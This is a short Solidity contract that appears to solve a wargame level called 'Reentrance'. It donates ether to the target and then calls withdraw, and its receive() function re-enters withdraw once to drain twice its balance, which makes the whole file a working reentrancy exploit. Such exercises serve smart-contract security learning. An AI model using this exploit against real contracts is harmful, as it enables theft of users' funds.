// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./level.sol";

contract Solution {
    Reentrance level;
    bool flag;

    constructor(address payable _addr) public payable {
        level = Reentrance(_addr);
        level.donate{value: msg.value}(address(this));
        flag = true;
    }

    // withdraw 2x of the balance
    // 1x via solve and 1x via receive
    function solve() public {
        level.withdraw(level.balances(address(this)));
    }

    receive() external payable {
        if (flag) {
            flag = false;
            level.withdraw(level.balances(address(this)));
        }
    }
}
